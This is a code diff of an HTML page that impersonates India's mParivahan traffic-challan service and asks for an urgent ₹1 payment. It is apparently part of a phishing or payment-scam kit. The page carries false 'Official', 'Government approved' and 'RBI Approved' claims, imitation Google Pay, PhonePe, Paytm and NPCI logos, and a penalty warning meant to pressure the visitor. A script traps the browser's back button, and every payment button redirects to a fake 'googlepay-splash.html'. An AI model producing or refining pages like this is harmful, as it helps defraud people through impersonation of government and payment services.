@@ -1,258 +1,285 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>चालान भुगतान - mParivahan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>mParivahan – Pay Challan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow-x: hidden;
+      position: fixed;
+    }
     
     body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-      min-height: 100vh;
+      background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      font-family: 'Poppins', sans-serif;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
     }
     
     .container {
-      background: white;
-      border-radius: 24px;
-      padding: 30px 25px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-      animation: slideUp 0.6s ease-out;
-    }
-    
-    .challan-header {
-      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
-      color: white;
-      padding: 20px;
-      border-radius: 16px;
+      background: #fff;
+      border-radius: 20px;
+      padding: 20px 18px;
+      width: 88%;
+      max-width: 340px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
       text-align: center;
-      margin-bottom: 20px;
       position: relative;
-      overflow: hidden;
+      margin: 15px auto;
+      box-sizing: border-box;
     }
     
-    .challan-header::before {
-      content: '⚠️';
+    .premium-badge {
       position: absolute;
-      font-size: 100px;
-      opacity: 0.1;
-      right: -20px;
-      top: -20px;
-    }
-    
-    .challan-title {
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 5px;
-      opacity: 0.9;
-    }
-    
-    .challan-amount {
-      font-size: clamp(38px, 10vw, 48px);
-      font-weight: 900;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-    }
-    
-    .challan-label {
-      font-size: 12px;
-      opacity: 0.9;
-      margin-top: 3px;
-    }
-    
-    .warning-card {
-      background: linear-gradient(135deg, #fff7ed, #fef3c7);
-      border: 2px dashed #f59e0b;
-      padding: 15px;
-      border-radius: 14px;
-      margin-bottom: 20px;
-      animation: pulse 2s infinite;
-    }
-    
-    .warning-title {
-      font-size: 15px;
+      top: -4px;
+      right: -4px;
+      background: linear-gradient(135deg, #4f46e5, #7c3aed);
+      color: #fff;
+      padding: 5px 14px;
+      border-radius: 0 20px 0 16px;
+      font-size: 10px;
       font-weight: 700;
-      color: #92400e;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
+      text-transform: uppercase;
     }
     
-    .warning-text {
-      font-size: 13px;
-      color: #78350f;
-      line-height: 1.5;
+    .header {
+      background: linear-gradient(135deg, #dc2626, #b91c1c);
+      color: #fff;
+      padding: 14px;
+      border-radius: 14px;
+      margin-bottom: 14px;
+      box-shadow: 0 6px 15px rgba(220, 38, 38, 0.3);
+    }
+    
+    .price {
+      font-size: clamp(28px, 8vw, 36px);
+      font-weight: 800;
+      margin-bottom: 3px;
+    }
+    
+    .price-label {
+      font-size: 11px;
+      opacity: 0.9;
       font-weight: 500;
     }
     
-    .payment-title {
-      font-size: 16px;
-      font-weight: 700;
-      color: #1f2937;
-      text-align: center;
-      margin-bottom: 15px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-    
-    .upi-logos {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
-      flex-wrap: wrap;
-    }
-    
-    .upi-logo {
-      width: 60px;
-      height: 60px;
-      background: white;
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 32px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      border: 2px solid #e5e7eb;
-    }
-    
-    .upi-logo:active {
-      transform: scale(0.95);
-    }
-    
-    .pay-btn {
-      width: 100%;
-      background: linear-gradient(135deg, #10b981, #059669);
-      color: white;
-      border: none;
-      padding: 18px;
-      border-radius: 14px;
-      font-size: 18px;
-      font-weight: 700;
-      cursor: pointer;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
-      transition: all 0.3s ease;
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    
-    .pay-btn:active {
-      transform: scale(0.98);
-    }
-    
-    .secure-badge {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+    .offer-msg {
+      background: linear-gradient(135deg, #fef3c7, #fde68a);
+      padding: 12px;
+      border-radius: 12px;
+      border-left: 3px solid #f59e0b;
+      color: #92400e;
       font-size: 12px;
-      color: #6b7280;
-      font-weight: 600;
-      padding: 10px;
-      background: #f9fafb;
-      border-radius: 10px;
+      line-height: 1.5;
+      margin-bottom: 14px;
     }
     
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      margin-top: 20px;
-      padding-top: 20px;
-      border-top: 1px solid #e5e7eb;
+    .offer-msg strong {
+      font-weight: 700;
+      display: block;
+      margin-bottom: 3px;
+      font-size: 13px;
+    }
+    
+    .features-list {
+      text-align: left;
+      margin: 14px 0;
+      background: linear-gradient(135deg, #f8f9ff, #fff);
+      padding: 14px;
+      border-radius: 12px;
     }
     
     .feature-item {
-      text-align: center;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 12px;
+      color: #333;
+    }
+    
+    .feature-item:last-child {
+      margin-bottom: 0;
     }
     
     .feature-icon {
-      font-size: 24px;
-      margin-bottom: 5px;
+      width: 24px;
+      height: 24px;
+      background: linear-gradient(135deg, #4f46e5, #7c3aed);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      flex-shrink: 0;
     }
     
-    .feature-label {
-      font-size: 10px;
-      color: #6b7280;
+    .payment-section {
+      margin: 16px 0 14px;
+    }
+    
+    .section-title {
+      font-weight: 600;
+      font-size: 13px;
+      margin-bottom: 12px;
+      color: #333;
+    }
+    
+    .pay-options {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+    
+    .pay-option {
+      width: 55px;
+      height: 55px;
+      background: #fff;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
+    }
+    
+    .pay-option svg {
+      width: 35px;
+      height: 35px;
+    }
+    
+    .pay-btn {
+      background: linear-gradient(135deg, #4f46e5, #7c3aed);
+      color: #fff;
+      border: none;
+      padding: 13px;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      width: 100%;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(79, 70, 229, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .secure {
+      margin-top: 14px;
+      padding: 8px;
+      background: linear-gradient(135deg, #e8f5e9, #f1f8e9);
+      border-radius: 10px;
+      font-size: 11px;
+      color: #2e7d32;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
       font-weight: 600;
     }
     
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(50px); }
-      to { opacity: 1; transform: translateY(0); }
+    .secure svg {
+      height: 18px;
+      width: 50px;
     }
     
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.02); }
+    .timer {
+      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
+      color: #fff;
+      padding: 8px;
+      border-radius: 10px;
+      font-size: 11px;
+      font-weight: 600;
+      margin-top: 12px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="challan-header">
-      <div class="challan-title">यातायात चालान | Traffic Challan</div>
-      <div class="challan-amount">₹1</div>
-      <div class="challan-label">भुगतान योग्य राशि</div>
+    <div class="premium-badge">🚗 Official</div>
+    
+    <div class="header">
+      <div class="price">₹1 Only</div>
+      <div class="price-label">Traffic Challan Payment</div>
     </div>
     
-    <div class="warning-card">
-      <div class="warning-title">
-        <span>🚨</span>
-        <span>तत्काल भुगतान आवश्यक!</span>
-      </div>
-      <div class="warning-text">
-        यातायात नियमों के उल्लंघन के लिए चालान जारी किया गया है। कृपया तुरंत भुगतान करें।
-      </div>
+    <div class="offer-msg">
+      <strong>⚠️ Pay Your Challan Now!</strong>
+      Clear your traffic violation instantly with secure payment
     </div>
     
-    <div class="payment-title">💳 भुगतान विधि चुनें</div>
-    
-    <div class="upi-logos">
-      <div class="upi-logo" onclick="goToPayment()">💳</div>
-      <div class="upi-logo" onclick="goToPayment()">📱</div>
-      <div class="upi-logo" onclick="goToPayment()">💰</div>
-    </div>
-    
-    <button class="pay-btn" onclick="goToPayment()">
-      <span>🔒</span>
-      <span>UPI से ₹1 का भुगतान करें</span>
-    </button>
-    
-    <div class="secure-badge">
-      <span>🔐</span>
-      <span>100% सुरक्षित भुगतान | RBI Approved</span>
-    </div>
-    
-    <div class="features-grid">
+    <div class="features-list">
       <div class="feature-item">
-        <div class="feature-icon">⚡</div>
-        <div class="feature-label">तत्काल<br>Instant</div>
+        <div class="feature-icon">✓</div>
+        <div>Instant challan clearance</div>
       </div>
       <div class="feature-item">
-        <div class="feature-icon">✅</div>
-        <div class="feature-label">सुरक्षित<br>Secure</div>
+        <div class="feature-icon">🔒</div>
+        <div>100% Secure payment</div>
       </div>
       <div class="feature-item">
         <div class="feature-icon">📄</div>
-        <div class="feature-label">रसीद<br>Receipt</div>
+        <div>Official receipt via SMS</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">🏛️</div>
+        <div>Government approved</div>
       </div>
     </div>
+    
+    <div class="payment-section">
+      <div class="section-title">Select Payment</div>
+      
+      <div class="pay-options">
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- Google Pay Logo -->
+          <svg viewBox="0 0 512 200" xmlns="http://www.w3.org/2000/svg">
+            <text x="10" y="120" font-family="Google Sans, Arial" font-size="100" font-weight="bold" fill="#5F6368">G</text>
+            <circle cx="250" cy="100" r="80" fill="#4285F4"/>
+            <circle cx="250" cy="100" r="50" fill="#fff"/>
+            <text x="300" y="120" font-family="Google Sans, Arial" font-size="80" font-weight="bold" fill="#34A853">Pay</text>
+          </svg>
+        </div>
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- PhonePe Logo -->
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="24" cy="24" r="20" fill="#5F259F"/>
+            <text x="24" y="30" font-family="Arial" font-size="16" font-weight="bold" fill="#fff" text-anchor="middle">Pe</text>
+          </svg>
+        </div>
+        <div class="pay-option" onclick="goToSplash()">
+          <!-- Paytm Logo -->
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#00BAF2"/>
+            <text x="24" y="30" font-family="Arial" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">Paytm</text>
+          </svg>
+        </div>
+      </div>
+      
+      <button class="pay-btn" onclick="goToSplash()">💳 Pay ₹1</button>
+    </div>
+    
+    <div class="secure">
+      <span>🔐 Secure</span>
+      <!-- NPCI Logo -->
+      <svg viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
+        <rect width="100" height="30" rx="4" fill="#FF6B35"/>
+        <text x="50" y="20" font-family="Arial" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">NPCI</text>
+      </svg>
+    </div>
+    
+    <div class="timer">⏰ Pay Now - Avoid Penalties!</div>
   </div>
 
   <script>
@@ -262,7 +289,7 @@
       history.go(1);
     };
     
-    function goToPayment() {
+    function goToSplash() {
       window.location.href = 'googlepay-splash.html';
     }
   </script>
